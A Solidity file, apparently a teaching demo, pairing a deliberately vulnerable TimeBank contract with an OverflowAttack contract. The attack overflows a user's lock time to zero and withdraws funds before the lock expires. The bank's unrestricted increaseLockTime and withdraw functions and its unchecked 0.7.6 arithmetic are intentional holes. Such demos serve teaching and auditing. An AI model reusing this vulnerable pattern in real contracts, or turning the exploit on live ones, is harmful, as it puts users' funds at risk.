// SPDX-License-Identifier: GPL-3.0

// pragma solidity ^0.8.13;
pragma solidity ^0.7.6;

contract TimeBank {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(address _user, uint _time) public {
        lockTime[_user] += _time;
    }

    function withdraw(address user) public {
        uint balance = balances[user];
        require(balance > 0, "No funds available to withdraw");
        require(block.timestamp > lockTime[user], "You have to wait to withdraw funds");

        balances[user] = 0;
        (bool sent, ) = user.call{value: balance}("");

        require(sent, "Failed to send Ether");
    }

    // @notice Get the balance of Ether held by the contract.
    // @return The balance of the contract in wei.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract OverflowAttack {
    address payable bankAddress;
    uint public attackerBalance;

    constructor(address payable _bankAddress) {
        bankAddress = _bankAddress;
    }

    fallback() external payable {}

    function attack() public payable {
        TimeBank(bankAddress).increaseLockTime(msg.sender, type(uint).max - TimeBank(bankAddress).lockTime(msg.sender) + 1);
        TimeBank(bankAddress).withdraw(msg.sender);

        attackerBalance = address(this).balance;
        payable(msg.sender).transfer(attackerBalance);
    }

    // @notice Get the balance of Ether held by the contract.
    // @return The balance of the contract in wei.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}